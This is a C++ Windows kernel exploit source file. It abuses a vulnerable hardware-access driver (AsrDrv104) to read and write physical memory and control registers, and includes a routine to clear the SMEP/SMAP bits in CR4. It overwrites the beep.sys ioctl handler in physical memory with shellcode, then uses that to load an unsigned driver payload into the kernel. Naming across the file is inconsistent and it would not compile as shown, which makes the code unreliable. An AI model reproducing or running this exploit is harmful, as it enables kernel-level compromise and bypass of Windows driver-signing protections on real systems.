#include <string>
#include <vector>
#include <unordered_map>
#include <Shlwapi.h>
#include <Windows.h>
#include <winternl.h>
#include <conio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <intrin.h>
#include "proto.h"

// Constants
constexpr size_t MAX_SHELLCODE_SIZE = 0x1000;
constexpr size_t IV_SIZE = 21;
constexpr size_t KEY_SIZE = 16;
constexpr size_t FOOTER_SIZE = sizeof(ioctl_footer);
constexpr uint8_t MAGIC_VALUE = 0x69;

// Type Definitions
using QWORD = uint64_t;

BYTE shellcode[MAX_SHELLCODE_SIZE];

// Exit Function
void exitProgram() {
    printf("Press any key to exit\n");
    (void)_getwche();
    exit(0);
}

// Hex Dump Function
void hexdump(const unsigned char* buffer, size_t length) {
    for (size_t i = 0; i < length; i++) {
        printf("%02x ", buffer[i]);
    }
    printf("\n");
}

// Structure for Physical Memory Page
#pragma pack(push, 1)
struct PhysicalMemoryPage {
    uint8_t type;
    uint8_t shareDisposition;
    uint16_t flags;
    uint64_t pBegin;
    uint32_t sizeButNotExactly;
    uint32_t pad;

    static constexpr uint16_t MEMORY_LARGE_40 = 0x200;
    static constexpr uint16_t MEMORY_LARGE_48 = 0x400;
    static constexpr uint16_t MEMORY_LARGE_64 = 0x800;

    uint64_t size() const noexcept {
        if (flags & MEMORY_LARGE_40) {
            return static_cast<uint64_t>(sizeButNotExactly) << 8;
        } else if (flags & MEMORY_LARGE_48) {
            return static_cast<uint64_t>(sizeButNotExactly) << 16;
        } else if (flags & MEMORY_LARGE_64) {
            return static_cast<uint64_t>(sizeButNotExactly) << 32;
        }
        return static_cast<uint64_t>(sizeButNotExactly);
    }
};
static_assert(sizeof(PhysicalMemoryPage) == 20, "PhysicalMemoryPage size is incorrect");
#pragma pack(pop)

// Structure for Physical Memory Layout Information
struct PhysicalMemoryLayoutInfo {
    QWORD idk;
    QWORD idk2;
    ULONG count;
    PhysicalMemoryPage pages[];
} *physicalMemoryLayoutInfo = nullptr;

// IOCTL Header Structure
#pragma pack(push, 1)
struct IoctlHeader {
    WORD pad;
    DWORD iv_size;
    uint8_t iv[IV_SIZE];
    uint8_t key[KEY_SIZE];
    uint8_t pad2[3]; // Alignment
};

// IOCTL Footer Structure
struct IoctlFooter {
    DWORD cmd_size;
    WORD pad;
};
#pragma pack(pop)

size_t shellcodeDataSize = 0;
MyIrpStruct* shellcodeData = nullptr;

// Prepare IOCTL Data Function
void PrepareIoctlData(void* commandInput, size_t commandSize, PVOID* ioctlDataOutput, size_t* bufferSizeOutput) {
    IoctlHeader header{};
    memset(header.iv, MAGIC_VALUE, sizeof(header.iv));
    memset(header.key, MAGIC_VALUE, sizeof(header.key));
    header.iv_size = sizeof(header.iv);

    DWORD encryptedSize;
    BYTE* encryptedBuffer = nullptr;

    // Open AES Algorithm Provider
    BCRYPT_ALG_HANDLE algorithmHandle;
    if (BCryptOpenAlgorithmProvider(&algorithmHandle, BCRYPT_AES_ALGORITHM, nullptr, 0) != STATUS_SUCCESS) {
        // Handle error
        return;
    }

    // Generate Symmetric Key
    BYTE encryptionKey[32] = {0};
    memcpy(encryptionKey, "C110DD4FE9434147B92A5A1E3FDBF29A", 32);
    *(__m128i*)&encryptionKey[13] = _mm_loadu_si128(reinterpret_cast<const __m128i*>(header.key));

    HANDLE keyHandle;
    if (BCryptGenerateSymmetricKey(algorithmHandle, &keyHandle, nullptr, 0, encryptionKey, sizeof(encryptionKey), 0) != STATUS_SUCCESS) {
        // Handle error
        return;
    }

    BYTE ivCopy[IV_SIZE];
    memcpy(ivCopy, header.iv, header.iv_size);

    size_t cipherBufferSize = commandSize + 64; // Adjust size as necessary
    encryptedBuffer = (BYTE*)calloc(1, cipherBufferSize);
    if (!encryptedBuffer) {
        // Handle memory allocation failure
        return;
    }

    // Encrypt the command input
    if (BCryptEncrypt(keyHandle, static_cast<BYTE*>(commandInput), commandSize, nullptr, ivCopy, header.iv_size, encryptedBuffer, cipherBufferSize, &encryptedSize, BCRYPT_BLOCK_PADDING) != STATUS_SUCCESS) {
        // Handle encryption error
        free(encryptedBuffer);
        return;
    }

    // Create Output Buffer
    size_t bufferSize = sizeof(IoctlHeader) + encryptedSize + FOOTER_SIZE;
    BYTE* buffer = (BYTE*)calloc(1, bufferSize);
    if (!buffer) {
        // Handle memory allocation failure
        free(encryptedBuffer);
        return;
    }

    memcpy(buffer, &header, sizeof(header));
    memcpy(buffer + sizeof(header), encryptedBuffer, encryptedSize);
    IoctlFooter* footer = reinterpret_cast<IoctlFooter*>(buffer + bufferSize - FOOTER_SIZE);
    footer->cmd_size = encryptedSize;

    // Output parameters
    *ioctlDataOutput = buffer;
    *bufferSizeOutput = bufferSize;

    // cleanup
    free(encryptedBuffer);
}


#if 0
void CryptoTest() {
    ioctl_header ioctlCryptoParams{};
    memset(&ioctlCryptoParams, 0x41, sizeof(ioctlCryptoParams));

    const BYTE* plaintext = reinterpret_cast<const BYTE*>("ayylmao123456___");

    // set up the encryption key
    BYTE encryptionKey[32] = {0};
    memcpy(encryptionKey, "C110DD4FE9434147B92A5A1E3FDBF29A", sizeof(encryptionKey));
    *reinterpret_cast<__m128i*>(&encryptionKey[13]) = _mm_loadu_si128(reinterpret_cast<const __m128i*>(&ioctlCryptoParams.iv[21]));

    BYTE cipherText[64] = {0};
    DWORD encryptedSize = 0;

    BYTE* iv = ioctlCryptoParams.iv;

    // pen AES 
    BCRYPT_ALG_HANDLE algorithmHandle;
    if (BCryptOpenAlgorithmProvider(&algorithmHandle, BCRYPT_AES_ALGORITHM, nullptr, 0) != STATUS_SUCCESS) {
        fprintf(stderr, "Failed to open algorithm provider\n");
        return;
    }

    // generate symmetric key
    HANDLE keyHandle;
    DWORD result = BCryptGenerateSymmetricKey(algorithmHandle, &keyHandle, nullptr, 0, encryptionKey, sizeof(encryptionKey), 0);
    if (result != STATUS_SUCCESS) {
        fprintf(stderr, "BCryptGenerateSymmetricKey failed: %d\n", result);
        return;
    }

    // prepare to decrypt
    DWORD inputSize = sizeof(cipherText);
    DWORD outputSize = 0;

    result = BCryptDecrypt(keyHandle, cipherText, inputSize, nullptr, iv, inputSize, nullptr, 0, &outputSize, BCRYPT_BLOCK_PADDING);
    if (result != STATUS_SUCCESS) {
        fprintf(stderr, "BCryptDecrypt (first call) failed: %d\n", result);
        return;
    }
    printf("Expected output size: %d bytes\n", outputSize);

    // allocate memory 
    BYTE* outputBuffer = reinterpret_cast<BYTE*>(calloc(1, outputSize));
    if (!outputBuffer) {
        fprintf(stderr, "Memory allocation failed for output buffer\n");
        return;
    }

    // decrypt the ciphertext
    DWORD resultSize = 0;
    result = BCryptDecrypt(keyHandle, cipherText, inputSize, nullptr, iv, inputSize, outputBuffer, outputSize, &resultSize, BCRYPT_BLOCK_PADDING);
    if (result != STATUS_SUCCESS) {
        fprintf(stderr, "BCryptDecrypt (second call) failed: %x\n", result);
        free(outputBuffer);
        return;
    }

    printf("Decrypted %d bytes:\n", resultSize);
    for (DWORD i = 0; i < resultSize; i++) {
        printf("%02x ", outputBuffer[i]);
    }
    printf("\n");

    // clean
    free(outputBuffer);
    bye();
}
#endif

#pragma pack(push, 1)
union RwEverythingArgs {
    unsigned __int8 charArgs[24];
    unsigned __int16 wordArgs[12];
    DWORD dwordArgs[6];
    uint64_t qwordArgs[3];
};

struct DriverCmd {
    unsigned int opcode;
    int padding; // Renamed for clarity
    RwEverythingArgs args;
};
#pragma pack(pop)

HANDLE hDevice;
HANDLE hBeep;

BOOL DriverCall(DWORD opcode, RwEverythingArgs* args, void** output, size_t* outputBytes) {
    DriverCmd command = {};
    command.opcode = opcode;
    memcpy(&command.args, args, sizeof(RwEverythingArgs));

    void* ioctlData = nullptr;
    size_t inputBufferSize = 0;
    PrepareIoctlData(&command, sizeof(command), &ioctlData, &inputBufferSize);

    DWORD bytesReturned = 0;
    BYTE outputBuffer[0x1000] = {0}; // Initialize output buffer

    // Perform device I/O control operation
    BOOL result = DeviceIoControl(hDevice, 0x22EC00, ioctlData, inputBufferSize, outputBuffer, sizeof(outputBuffer), &bytesReturned, NULL);

    // Cleanup and error handling
    free(ioctlData); // Assuming PrepareIoctlData dynamically allocated memory
    if (!result) {
        fprintf(stderr, "DeviceIoControl failed: %x\n", GetLastError());
        return FALSE;
    }

    // Handle output if requested
    if (output) {
        *output = malloc(bytesReturned);
        if (!*output) {
            fprintf(stderr, "Memory allocation for output failed\n");
            return FALSE;
        }
        if (outputBytes) *outputBytes = bytesReturned;
        memcpy(*output, outputBuffer, bytesReturned);
    }

    return TRUE;
}

#define OPCODE_READ_CR 0x22E86C
#define OPCODE_WRITE_CR 0x22E870
#define OPCODE_READ_PHYSMEM 0x22E808
#define OPCODE_WRITE_PHYSMEM 0x22E80C

uint64_t ReadCrx(DWORD which)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.dword_args[0] = which;

	rweverything_args* out;
	DriverCall(OPCODE_READ_CR, &args, (void**)&out, NULL);

	uint64_t crX = out->qword_args[1];
	free(out);

	return crX;
}

void WriteCrx(DWORD which, uint64_t value)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.dword_args[0] = which;
	args.qword_args[1] = value;
	DriverCall(OPCODE_WRITE_CR, &args, NULL, NULL);
}

// bsods if you write to cr4
uint64_t DisableSmap()
{
	uint64_t cr4 = ReadCrx(4);
	printf("cr4 = %llx\n", cr4);

	uint64_t mask = (1 << 21) | (1 << 20); // SMAP and SMEP

	WriteCrx(4, cr4 & ~mask);
	//printf("smap + smep DISABLED!\n");

	return cr4; // return old value
}

BOOL ReadPhysical(uint64_t phys_addr, DWORD len, void* out_buf)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.qword_args[0] = phys_addr;
	args.dword_args[2] = len;
	args.dword_args[3] = 2; // granularity = DWORD
	args.qword_args[2] = (uint64_t)out_buf;
	return DriverCall(OPCODE_READ_PHYSMEM, &args, NULL, NULL);
}

BOOL WritePhysical(uint64_t phys_addr, DWORD len, void* in_buf)
{
	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.qword_args[0] = phys_addr;
	args.dword_args[2] = len;
	args.dword_args[3] = 0; // granularity = byte
	args.qword_args[2] = (uint64_t)in_buf;
	return DriverCall(OPCODE_WRITE_PHYSMEM, &args, NULL, NULL);
}

// page offset of our victim ioctl handler in beep.sys
QWORD ioctl_handler_pageOffset = 0x270;

BOOL found_ioctl = FALSE;

struct code_backup_t
{
	uint64_t phys_addr;
	BYTE page_contents[0x1000];
};

std::vector<code_backup_t> beepBackup;

void ScanPages(uint64_t start, uint64_t end)
{
	printf("Scanning memory at %p-%p\n", (void*)start, (void*)end);

	unsigned char beepPattern[53] = {
			0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00,
			0x00, 0x4C, 0x8B, 0xD2, 0x41, 0x8B, 0x40, 0x18, 0x2D, 0x00, 0x00, 0x01,
			0x00, 0x0F, 0x84, 0x63, 0x04, 0x00, 0x00, 0x83, 0xF8, 0x04, 0x0F, 0x85,
			0x4A, 0x04, 0x00, 0x00, 0x33, 0xC0, 0x41, 0x83, 0x78, 0x08, 0x08, 0x0F,
			0x82, 0x46, 0x04, 0x00, 0x00
	};

	size_t buf_size = 0x10000;
	size_t read_size = buf_size;
	BYTE* buf = (BYTE*)malloc(buf_size);
	if (!buf)
	{
		puts("Failed to allocate memory!");
		bye();
	}

	for (QWORD phys_addr = start; phys_addr < end;)
	{
		if (phys_addr % 0x100000 == 0)
		{
			printf("%p\r", (void*)phys_addr);
		}
		//printf("attempt to read phys mem at %p\n", (void*)phys_addr);
		BOOL success = ReadPhysical(phys_addr, read_size, buf);
		if (!success)
		{
			//printf("read at %p fails\r", (void*) phys_addr);
			if (read_size == buf_size)
			{
				read_size = 0x1000; // retry with one page
			}
			else if (read_size == 0x1000)
			{
				// even retrying with one page fails
				phys_addr += read_size;
				read_size = buf_size;
			}
			continue;
		}
		//printf("read %p success\n", (void*)phys_addr);
		for (int off = 0; off < read_size; off += 0x1000)
		{
			if (!memcmp(buf + off + ioctl_handler_pageOffset, beepPattern, sizeof(beepPattern)))
			{
				QWORD page_addr = phys_addr + off;
				QWORD beep_ioctl = page_addr + ioctl_handler_pageOffset;
				printf("\nFound beep.sys ioctl at %p\n", (void*)beep_ioctl);

				// back up the page contents (as we smash the original beep code, that will get called when our process closes beep handle).
				code_backup_t backup;
				backup.phys_addr = page_addr;
				memcpy(backup.page_contents, buf + off, 0x1000);
				beepBackup.emplace_back(backup);

				WritePhysical(beep_ioctl, 0x1000 - ioctl_handler_pageOffset, my_shellcode);
				found_ioctl = TRUE;
			}
		}
		phys_addr += read_size;
	}

	free(buf);
}

void ScanPhysical()
{
	Beep(440, 10);

	// 1. Scan physical memory for Beep.sys
	// 2. Overwrite the ioctl handler of Beep.sys in physical memory with our shellcode
	// 3. In shellcode we call ntoskrnl.exe!memcpy with controlled arguments (from IRP)
	// 4. Now we have arb write primitive
	// 5. then do the rest of the shit

	for (unsigned i = 0; i < physical_memory_layout_info->count; i++)
	{
		uint64_t start = physical_memory_layout_info->pmi[i].pBegin;
		uint64_t end = start + physical_memory_layout_info->pmi[i].size();
		ScanPages(start, end);
	}

	if (!found_ioctl)
	{
		printf("didn't find beep.sys\n");
		bye();
	}

	// lol xor eax,eax; mov cr3, rax
	//unsigned char shellcode[] = {
	//	0x31, 0xC0, 0x0F, 0x22, 0xD8,
	//};

	hexdump((BYTE*)my_shellcode_data, my_shellcode_data_sz);

	printf("ready kids?\n");

	fflush(stdout);
	_getwche();

	char out_buf[16]; // doesnt really matter
	DWORD bytes_returned;

	BOOL result = DeviceIoControl(hBeep, 0x1234, my_shellcode_data, my_shellcode_data_sz, out_buf, sizeof(out_buf), &bytes_returned, NULL);
	printf("trigger DeviceIoControl returns %d\n", result);

	// restore smashed beep code
	for (int i = 0; i < beepBackup.size(); i++)
	{
		WritePhysical(beepBackup[i].phys_addr, 0x1000, beepBackup[i].page_contents);
		printf("restored code at %p\n", (void*)beepBackup[i].phys_addr);
	}

	/*
	avoiding fault in windbg:
	
	0: kd> u MiShowBadMapper L20
nt!MiShowBadMapper:
fffff801`0a141ac4 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff801`0a141ac9 48896c2418      mov     qword ptr [rsp+18h],rbp
fffff801`0a141ace 4889742420      mov     qword ptr [rsp+20h],rsi
fffff801`0a141ad3 57              push    rdi
fffff801`0a141ad4 4881ec90000000  sub     rsp,90h
fffff801`0a141adb 488b050e511600  mov     rax,qword ptr [nt!_security_cookie (fffff801`0a2a6bf0)]
fffff801`0a141ae2 4833c4          xor     rax,rsp
fffff801`0a141ae5 4889842480000000 mov     qword ptr [rsp+80h],rax
fffff801`0a141aed 8a1de7ad1900    mov     bl,byte ptr [nt!MiState+0x1eda (fffff801`0a2dc8da)]

	then write 2 to nt!MiState+0x1eda (fffff801`0a2dc8da
	eb  fffff801`0a2dc8da 2

	*/

	return;
}

void QueryPhysicalMemoryLayout()
{
	HKEY h_key;
	DWORD type, size = 0;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory", 0, KEY_READ, &h_key);
	RegQueryValueEx(h_key, ".Translated", NULL, &type, NULL, &size); //get size
	if (!size)
	{
		printf("WTf can't open the key\n");
		bye();
	}
	BYTE* data = (BYTE*)malloc(size);
	RegQueryValueEx(h_key, ".Translated", NULL, &type, (BYTE*)data, &size);
	physical_memory_layout_info = (physical_memory_layout_info_t*)data;

	ULONG count = physical_memory_layout_info->count;
	if (!count)
	{
		printf("Query physical memory layout failed?\n");
		bye();
	}
	uint64_t total_pmem = 0;
	for (unsigned i = 0; i < count; i++)
	{
		uintptr_t end = physical_memory_layout_info->pmi[i].pBegin + physical_memory_layout_info->pmi[i].size();
		printf("%p - %p , type %02x , flags %04x , sharing %02x\n", (void*)physical_memory_layout_info->pmi[i].pBegin, (void*)end, physical_memory_layout_info->pmi[i].type, physical_memory_layout_info->pmi[i].flags, physical_memory_layout_info->pmi[i].shareDisposition);
		total_pmem += physical_memory_layout_info->pmi[i].size();
	}
	printf("you seem to have %.1f bytes physical memory mapped\n", (double)total_pmem/1e9);
}

std::unordered_map<std::string, uint64_t> whereTheKernelModulesAreAtYo;

BOOL APIENTRY LoadDriver_setup_shellcode_data(LPCSTR szPath) {
	int NonPagedPoolExecute = 0;

	LPVOID hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		puts("Invalid handle when map PE file");
		bye();
		return NULL;
	}

	HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);

	if (!hMapping) {
		puts("Cannot make file mapping");
		bye();
		return NULL;
	}

	LPVOID lpBase = (char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
	if (!lpBase) {
		puts("Cannot make MapViewOfFile");
		bye();
		return NULL;
	}

	PIMAGE_DOS_HEADER image = (PIMAGE_DOS_HEADER)lpBase;
	if (image->e_magic != IMAGE_DOS_SIGNATURE) {
		puts("IMAGE_DOS_SIGNATURE not matched");
		bye();
		return NULL;
	}

	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((uintptr_t)lpBase + image->e_lfanew);
	if (pe->Signature != IMAGE_NT_SIGNATURE) {
		puts("IMAGE_NT_SIGNATURE not matched");
		bye();
		return NULL;
	}

	LPVOID mapping = VirtualAlloc(nullptr, pe->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("mapping = %p size %x\n", mapping, pe->OptionalHeader.SizeOfImage);

	int num_sections = pe->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER* hdr = (IMAGE_SECTION_HEADER*)((uintptr_t)&pe->OptionalHeader + pe->FileHeader.SizeOfOptionalHeader);

	// map the fuckeign sections! :)
	memcpy(mapping, image, pe->OptionalHeader.SizeOfHeaders);
	for (int i = 0; i < num_sections; i++, hdr++) {
		void* src = (void*)((uintptr_t)image + hdr->VirtualAddress);
		void* dst = (void*)((uintptr_t)mapping + hdr->VirtualAddress);
		size_t size = hdr->SizeOfRawData;
		memset(dst, 0, size);
		memcpy(dst, src, size);

		char name[9];
		name[8] = 0;
		memcpy(name, hdr->Name, 8);
		printf("we map section %s (fileoffset %x to va %x-%x)\n", name, hdr->PointerToRawData, hdr->VirtualAddress, (uintptr_t)hdr->VirtualAddress+size);
	}

	// resolve the importsss

	IMAGE_DATA_DIRECTORY* imports_dir_info = &pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	printf("imports dir va = %x\n", imports_dir_info->VirtualAddress);

	if (imports_dir_info->VirtualAddress)
	{
		IMAGE_IMPORT_DESCRIPTOR* imports_dir = (IMAGE_IMPORT_DESCRIPTOR*)((uintptr_t)mapping + imports_dir_info->VirtualAddress);

		while (true)
		{
			if (imports_dir->Characteristics == 0)
			{
				printf("done\n");
				break;
			}

			PSTR moduleName = (PSTR)((uintptr_t)mapping + imports_dir->Name);

			printf("imports for %s\n", moduleName);

			HMODULE hModule = GetModuleHandleA(moduleName);

			if (!hModule)
			{
				hModule = LoadLibraryExA(moduleName, NULL, DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
			}

			if (!hModule)
			{
				printf("failed to map %s\n", moduleName);
				bye();
			}

			printf("%s at %p\n", moduleName, hModule);

			IMAGE_THUNK_DATA* importLookupTable = (PIMAGE_THUNK_DATA)((uintptr_t)mapping + imports_dir->OriginalFirstThunk);
			void** iat = (void**)((uintptr_t)mapping + imports_dir->FirstThunk);

			while (importLookupTable->u1.AddressOfData)
			{
				bool is_by_ordinal = importLookupTable->u1.AddressOfData >> 63;
				if (is_by_ordinal)
				{
					puts("Sorry import by ordinal isnt supportd xD");
					bye();
				}
				_IMAGE_IMPORT_BY_NAME* import_name = (_IMAGE_IMPORT_BY_NAME*)((uintptr_t)mapping + importLookupTable->u1.AddressOfData);
				PSTR name = import_name->Name;
				printf("do import %s\n", name);

				uintptr_t offset = (uintptr_t)GetProcAddress(hModule, name) - (uintptr_t)hModule;
				printf("%s = %p + %p\n", name, whereTheKernelModulesAreAtYo[moduleName], offset);
				uintptr_t resolved_import = whereTheKernelModulesAreAtYo[moduleName] + offset;
				*iat = (void*)resolved_import;

				importLookupTable++;
				iat++;
			}

			imports_dir++;
		}
	}

	// check relocs

	IMAGE_DATA_DIRECTORY* reloc_dir_info = &pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	IMAGE_BASE_RELOCATION* relocs = (IMAGE_BASE_RELOCATION*)((uintptr_t)mapping + reloc_dir_info->VirtualAddress);

	uintptr_t basediff = (uintptr_t)mapping - pe->OptionalHeader.ImageBase;

	void* relocs_end = (void*)((uintptr_t)relocs + reloc_dir_info->Size);
	while (relocs < relocs_end)
	{
		ULONG va = relocs->VirtualAddress;
		USHORT* entries = (USHORT*)((uintptr_t)relocs + sizeof(IMAGE_BASE_RELOCATION));
		int num_entries = (relocs->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		printf("page %x has %d relocs\n", va , num_entries);
		for (int i = 0; i < num_entries; i++)
		{
			USHORT entry = entries[i];
			USHORT reloc_type = entry >> 12;
			uintptr_t reloc_offset = (uintptr_t)(entry & 0xfff);
			if (reloc_type == IMAGE_REL_BASED_DIR64)
			{
				printf("IMAGE_REL_BASED_DIR64 at offset %x+%llx\n", va, reloc_offset);
			}
			else if (reloc_type == IMAGE_REL_BASED_ABSOLUTE)
			{
				printf("IMAGE_REL_BASED_ABSOLUTE at offset %x+%llx\n", va, reloc_offset);
			}
			else
			{
				printf("reloc type %d is NOT supported!\n", reloc_type);
				bye();
			}
		}
		relocs = (IMAGE_BASE_RELOCATION*)((uintptr_t)relocs + relocs->SizeOfBlock);
	}

	size_t payload_sz = pe->OptionalHeader.SizeOfImage;
	my_shellcode_data_sz = sizeof(MyIrpStruct) + payload_sz;
	my_shellcode_data = (MyIrpStruct*)malloc(my_shellcode_data_sz);
	if (!my_shellcode_data)
	{
		printf("malloc fails\n");
		bye();
	}
	memcpy(my_shellcode_data->payload, mapping, payload_sz);
	my_shellcode_data->payload_size = payload_sz;
	printf("fake irp handler data block size = %llx\n", my_shellcode_data_sz);

	return TRUE;
}

void Enum_kernel_modules()
{
	typedef NTSTATUS (*NtQuerySystemInformation_t)(
			SYSTEM_INFORMATION_CLASS SystemInformationClass,
			PVOID SystemInformation,
			ULONG SystemInformationLength,
			PULONG ReturnLength);

	NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t) GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");

	chonstexpr int SystemModuleInformation = 0xb;
	ULONG bytes = 0;
	NTSTATUS status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 0, bytes, &bytes);
	if (!bytes)
	{
		printf("NtQuerySystemInformation fails 1\n");
		bye();
	}

	typedef struct _SYSTEM_MODULE_ENTRY
	{
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];

	} 	SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION
	{
		ULONG               	ModulesCount;
		SYSTEM_MODULE_ENTRY		Modules[0];

	} 	SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

	PSYSTEM_MODULE_INFORMATION pMods = (PSYSTEM_MODULE_INFORMATION)malloc(bytes);
	RtlZeroMemory(pMods, bytes);
	status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pMods, bytes, &bytes);
	if (status < 0)
	{
		puts("NtQuerySystemInformation fails 2");
		bye();
	}
	printf("there are %u modules\n", pMods->ModulesCount);

	for (unsigned i = 0; i < pMods->ModulesCount; i++)
	{
		chonst char* filename = PathFindFileNameA((chonst char*)pMods->Modules[i].FullPathName);
		whereTheKernelModulesAreAtYo[filename] = (uint64_t)pMods->Modules[i].ImageBase;
		printf("%s %016llx\n", filename, whereTheKernelModulesAreAtYo[filename]);
	}
}

void Get_kernel_offsets()
{


	uint64_t ntoskrnl_base = whereTheKernelModulesAreAtYo["ntoskrnl.exe"];

	if (!ntoskrnl_base)
	{
		printf("Can't find address of ntoskrnl.exe\n");
		bye();
	}

	printf("ntoskrnl at %p\n", ntoskrnl_base);

	HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hNtoskrnl)
	{
		puts("failed to map ntoskrnl");
		bye();
	}

#define DO_THE_NEEDFUL(x) (x) = (decltype(x))

	my_shellcode_data->ntoskrnl = (void*)ntoskrnl_base;

	void* memcpy = (void*)GetProcAddress(hNtoskrnl, "memcpy");
	my_shellcode_data->nt_memcpy = (void (*)(void* dst, void* src, size_t len)) (ntoskrnl_base + (uint64_t)memcpy - (uint64_t)hNtoskrnl);
	printf("nt!memcpy at %p\n", my_shellcode_data->nt_memcpy);

	void* ExAllocatePoolWithTag = (void*)GetProcAddress(hNtoskrnl, "ExAllocatePoolWithTag");
	my_shellcode_data->nt_ExAllocatePoolWithTag = (void* (*)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag)) (ntoskrnl_base + (uint64_t)ExAllocatePoolWithTag - (uint64_t)hNtoskrnl);
	printf("nt!ExAllocatePoolWithTag at %p\n", my_shellcode_data->nt_ExAllocatePoolWithTag);

	void* PsCreateSystemThread = (void*)GetProcAddress(hNtoskrnl, "PsCreateSystemThread");
	my_shellcode_data->nt_PsCreateSystemThread = (NTSTATUS(*)(PHANDLE ThreadHandle, ULONG DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, void* ClientId, void* StartRoutine, PVOID StartContext)) (ntoskrnl_base + (uint64_t)PsCreateSystemThread - (uint64_t)hNtoskrnl);
	printf("nt!PsCreateSystemThread at %p\n", my_shellcode_data->nt_PsCreateSystemThread);

	void* IofCompleteRequest = (void*)GetProcAddress(hNtoskrnl, "IofCompleteRequest");
	my_shellcode_data->nt_IofCompleteRequest = (void*)(ntoskrnl_base + (uint64_t)IofCompleteRequest - (uint64_t)hNtoskrnl);
	printf("nt!IofCompleteRequest at %p\n", my_shellcode_data->nt_IofCompleteRequest);
}

void Get_shellcode()
{
	// Shellcode to allocate-copy-startthread shellcode
	HMODULE my_driver = LoadLibraryExA("MyDriver1.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
	printf("my_driver at %p\n", my_driver);
	if (!my_driver)
	{
		printf("failed to map MyDriver1.sys\n");
		bye();
	}
	void* shellcode = (void*) GetProcAddress(my_driver, "MyIRPHandler");
	printf("shellcode at %p\n", shellcode);
	memcpy(my_shellcode, shellcode, 0x1000);
	FreeLibrary(my_driver);
	//hexdump(my_shellcode, 0x1000);
}

int main()
{
	AddDllDirectory(L"C:\\Windows\\System32\\drivers");

	Enum_kernel_modules();
	LoadDriver_setup_shellcode_data("MyDriver1.sys");
	Get_kernel_offsets();
	Get_shellcode();

	//if (!memcpy_off)
	//{
	//	puts("failed to grab kernel offsets");
	//	bye();
	//}

	QueryPhysicalMemoryLayout();
	//bye();

	//Crypto_test();

	hBeep = CreateFileA("\\\\.\\GlobalRoot\\Device\\Beep", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	printf("hBeep = %p\n", hBeep);

	if (hBeep == INVALID_HANDLE_VALUE)
	{
		printf("GLE = %x\n", GetLastError());
		bye();
	}

	hDevice = CreateFileA("\\\\.\\GlobalRoot\\Device\\AsrDrv104", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	printf("hDevice = %p\n", hDevice);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("GLE = %x\n", GetLastError());
		bye();
	}

	rweverything_args args;
	memset(&args, 0, sizeof(args));
	args.dword_args[0] = 3; // cr3
	args.qword_args[1] = 0; // lol cr3 <- NULL

	rweverything_args* out;
	DriverCall(OPCODE_READ_CR, &args, (void**) &out, NULL);

	ScanPhysical();

	bye();
}
